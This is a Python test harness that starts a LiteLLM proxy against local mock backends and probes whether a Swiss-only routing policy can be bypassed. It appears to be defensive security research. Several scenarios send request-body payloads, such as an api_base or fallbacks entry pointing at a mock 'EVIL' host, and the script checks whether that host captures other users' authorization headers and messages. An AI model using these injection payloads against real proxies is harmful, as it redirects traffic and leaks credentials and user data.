"""EXP3: same questions, through the real LiteLLM proxy (v1.92.0 image), key-bound CH-only policy.

Mocks run in this process; the proxy runs as a subprocess with proxy1/config.yaml and the
policy_probe callback (events -> proxy1/events.jsonl). Merged timeline per scenario.
"""
import json, os, subprocess, sys, time
import httpx
import hooklab as H

HERE = os.path.dirname(os.path.abspath(__file__))
PD = os.path.join(HERE, "proxy1")
EVF = os.path.join(PD, "events.jsonl")
MODEF = os.path.join(PD, "mode.txt")
EVIL = "http://127.0.0.1:9299/v1"

mocks = H.start_evt_mocks({"a1": 9201, "a2": 9202, "b1": 9203, "u1": 9204, "evil": 9299})

CONFIG = f"""
model_list:
  - model_name: A
    litellm_params: {{model: openai/x-a1, api_base: "http://127.0.0.1:9201/v1", api_key: sk-admin-a1}}
    model_info: {{id: a1, jurisdiction: US, country: US, provider: us-cloud}}
  - model_name: A
    litellm_params: {{model: openai/x-a2, api_base: "http://127.0.0.1:9202/v1", api_key: sk-admin-a2}}
    model_info: {{id: a2, jurisdiction: CH, country: CH, provider: ch-cloud}}
  - model_name: B
    litellm_params: {{model: openai/x-b1, api_base: "http://127.0.0.1:9203/v1", api_key: sk-admin-b1}}
    model_info: {{id: b1, jurisdiction: CH, country: CH, provider: ch-cloud-2}}
  - model_name: U
    litellm_params: {{model: openai/x-u1, api_base: "http://127.0.0.1:9204/v1", api_key: sk-admin-u1}}
    model_info: {{id: u1, jurisdiction: US, country: US, provider: us-cloud}}
router_settings:
  routing_strategy: latency-based-routing
  fallbacks: [{{"A": ["B"]}}, {{"B": ["U"]}}]
  num_retries: 2
  retry_after: 0
  allowed_fails: 1
  cooldown_time: 30
litellm_settings:
  callbacks: ["policy_probe.proxy_handler_instance"]
  drop_params: true
general_settings:
  master_key: sk-master
  custom_auth: lab_auth.user_api_key_auth
"""


def start_proxy():
    open(os.path.join(PD, "config.yaml"), "w").write(CONFIG)
    open(EVF, "w").close()
    log = open(os.path.join(PD, "proxy.log"), "w")
    env = dict(os.environ, LITELLM_LOG="ERROR")
    p = subprocess.Popen(["litellm", "--config", os.path.join(PD, "config.yaml"), "--port", "4000"],
                         stdout=log, stderr=subprocess.STDOUT, env=env, cwd=PD)
    for _ in range(120):
        try:
            if httpx.get("http://127.0.0.1:4000/health/liveliness", timeout=1).status_code == 200:
                return p
        except Exception:
            pass
        time.sleep(1)
    raise SystemExit("proxy did not start; see proxy1/proxy.log")


def reset(modes=None, mode="plain"):
    for k, m in mocks.items():
        m.reset()
        m.mode = (modes or {}).get(k, "up")
    H.reset_events()
    open(EVF, "w").close()
    open(MODEF, "w").write(mode)


def merged():
    rows = [(t, n, d) for t, n, d in H.EVENTS]
    for line in open(EVF):
        j = json.loads(line)
        rows.append((round(j.pop("t") - H._T0, 3), j.pop("ev"), j))
    return sorted(rows, key=lambda r: r[0])


def report(title, resps):
    time.sleep(0.6)
    rows = merged()
    print(f"\n===== {title} =====")
    for t, n, d in rows:
        if n in ("async_log_success_event",):
            continue
        print(f"  {t:7.3f} {n:32s} {json.dumps(d, default=str)[:300]}")
    names = [r[1] for r in rows]
    print("  filter_calls=", names.count("async_filter_deployments"), " deployment_hook_calls=",
          names.count("async_pre_call_deployment_hook"), " proxy_pre_call_hook_calls=", names.count("async_pre_call_hook(proxy)"))
    for r in resps:
        print("  HTTP:", r)
    print("  COUNTS:", {k: m.count for k, m in mocks.items() if m.count})


def post(path, body, key="sk-commune-x", headers=None):
    h = {"Authorization": f"Bearer {key}"}
    h.update(headers or {})
    t = time.time()
    try:
        r = httpx.post("http://127.0.0.1:4000" + path, json=body, headers=h, timeout=60)
        try:
            j = r.json()
        except Exception:
            j = r.text
        if isinstance(j, dict) and "choices" in j:
            short = f"content={j['choices'][0]['message']['content']!r} model={j.get('model')}"
        else:
            short = json.dumps(j, default=str)[:260]
        hdr = {k: v for k, v in r.headers.items() if k.startswith("x-litellm-model-id") or k in ("x-litellm-attempted-fallbacks", "x-litellm-attempted-retries", "x-litellm-model-api-base")}
        return f"{r.status_code} {short} hdr={hdr} ({time.time()-t:.2f}s)"
    except Exception as e:
        return f"EXC {e}"


def get(path, key="sk-commune-x"):
    t = time.time()
    r = httpx.get("http://127.0.0.1:4000" + path, headers={"Authorization": f"Bearer {key}"}, timeout=120)
    return f"{r.status_code} {r.text[:600]} ({time.time()-t:.2f}s)"


MSG = [{"role": "user", "content": "citizen data"}]


def main():
    which = sys.argv[1:]
    want = lambda k: not which or k in which
    p = start_proxy()
    try:
        if want("P1"):
            reset({"a2": "down"})
            report("P1 commune key, model A, a2(CH) down; policy CH-only -> expect a2 retries, then B/b1; a1(US) zero",
                   [post("/v1/chat/completions", {"model": "A", "messages": MSG})])
        if want("P1b"):
            reset({"a2": "down", "b1": "down"})
            report("P1b all CH down (a2,b1); fallback chain A->B->U (U is US) -> expect error, a1/u1 zero",
                   [post("/v1/chat/completions", {"model": "A", "messages": MSG})])
        if want("P2"):
            reset()
            report("P2 commune key, model='a1' (US deployment id)",
                   [post("/v1/chat/completions", {"model": "a1", "messages": MSG})])
        if want("P2d"):
            reset(mode="defense")
            report("P2d same as P2 with defense-in-depth deployment hook",
                   [post("/v1/chat/completions", {"model": "a1", "messages": MSG})])
        if want("P4"):
            reset()
            report("P4 body api_base=EVIL (root)", [post("/v1/chat/completions", {"model": "A", "messages": MSG, "api_base": EVIL})])
        if want("P6"):
            reset()
            report("P6 policy override attempt via body metadata/tags/headers (open key)",
                   [post("/v1/chat/completions", {"model": "A", "messages": MSG,
                                                  "metadata": {"user_api_key_metadata": {"routing_policy": "none"},
                                                               "user_api_key_team_metadata": {"routing_policy": "none"},
                                                               "tags": ["US"], "routing_policy": "none"}},
                         key="sk-commune-x", headers={"x-litellm-tags": "US", "x-routing-policy": "none"})])
        if want("P8"):
            reset()
            report("P8 body mock_response + mock_testing_fallbacks", [post("/v1/chat/completions", {"model": "U", "messages": MSG, "mock_response": "hi", "mock_testing_fallbacks": True})])
        if want("P7"):
            reset()
            report("P7a /v1/embeddings model A", [post("/v1/embeddings", {"model": "A", "input": "citizen data"})])
            reset()
            report("P7b /v1/responses model A", [post("/v1/responses", {"model": "A", "input": "citizen data"})])
            reset()
            report("P7c comma batch model='A,U'", [post("/v1/chat/completions", {"model": "A,U", "messages": MSG})])
        if want("P5"):
            reset()
            report("P5 body api_key only (not banned) -> clientside credential path", [post("/v1/chat/completions", {"model": "A", "messages": MSG, "api_key": "sk-caller"})])
        if want("P9"):
            reset()
            report("P9 GET /health (open key)", [get("/health", key="sk-open")])
        if want("P3"):
            reset({"a1": "down", "a2": "down"})
            report("P3 ATTACK: body fallbacks=[{'model':'B','api_base':EVIL}], a1+a2 down (open key)",
                   [post("/v1/chat/completions", {"model": "A", "messages": MSG, "fallbacks": [{"model": "B", "api_base": EVIL}]}, key="sk-open")])
            reset()
            report("P3v VICTIM: commune key, 12 plain requests to B",
                   [post("/v1/chat/completions", {"model": "B", "messages": MSG}) for _ in range(12)])
            print("  EVIL received auth headers:", sorted({r['headers'].get('authorization', '')[:20] for r in mocks['evil'].requests}))
            print("  EVIL received messages:", [r['body'].get('messages') for r in mocks['evil'].requests][:2])
            reset(mode="defense")
            report("P3d VICTIM with defense-in-depth deployment hook: commune key, 12 plain requests to B",
                   [post("/v1/chat/completions", {"model": "B", "messages": MSG}) for _ in range(12)])
            reset({"b1": "down"}, mode="plain")
            report("P3w VICTIM, b1 down, jurisdiction-only filter: commune key, 3 sequential requests to B",
                   [post("/v1/chat/completions", {"model": "B", "messages": MSG}) for _ in range(3)])
            print("  EVIL received auth headers:", sorted({r['headers'].get('authorization', '')[:20] for r in mocks['evil'].requests}))
            print("  EVIL received messages:", [r['body'].get('messages') for r in mocks['evil'].requests][:2])
            reset({"b1": "down"}, mode="strict")
            report("P3s VICTIM, b1 down, registry-strict filter (id+api_base+no original_model_id)",
                   [post("/v1/chat/completions", {"model": "B", "messages": MSG})])
            reset({"a1": "down", "a2": "down"}, mode="defense")
            report("P3a2 ATTACK again but by a CH-only commune key with strict filter + deployment-hook defense",
                   [post("/v1/chat/completions", {"model": "A", "messages": MSG, "fallbacks": [{"model": "B", "api_base": EVIL}]})])
    finally:
        p.terminate()
        try:
            p.wait(10)
        except Exception:
            p.kill()


main()
